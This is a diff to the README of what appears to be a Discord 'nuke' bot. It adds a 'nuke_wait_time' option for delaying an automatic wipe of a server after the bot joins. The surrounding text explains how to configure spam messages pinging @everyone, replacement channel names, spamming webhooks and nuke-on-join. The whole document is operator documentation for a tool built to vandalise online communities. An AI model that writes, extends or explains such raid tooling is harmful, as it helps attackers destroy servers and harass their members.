@@ -20,6 +20,7 @@ spam_messages = ["@everyone nuked", "@everyone get nuked"]
 channel_names = ["nuked", "get nuked"]
 webhook_usernames = ["nuked", "get nuked"]
 nuke_on_join = False
+nuke_wait_time = 0
 ```
 **spam_messages** : The messages your bot will spam after nuking the server. Make sure that each entry in the list is a string and separated by a comma.
  
@@ -28,6 +29,8 @@ nuke_on_join = False
 **webhook_usernames** : Usernames of the webhooks your bot will use to spam channels when nuking. Just like spam_messages and channel_names, this should be a list of strings separated by commas.
  
 **nuke_on_join** : This will determine if your bot nukes the server as soon as it's added. This should either be True or False. By default it is set to False.
+ 
+**nuke_wait_time** : The amout of time (in seconds) that the bot will wait before nuking the server when autonuke is enabled.
 
 # Commands
 > cmds : DMs you all of the bot's commands.
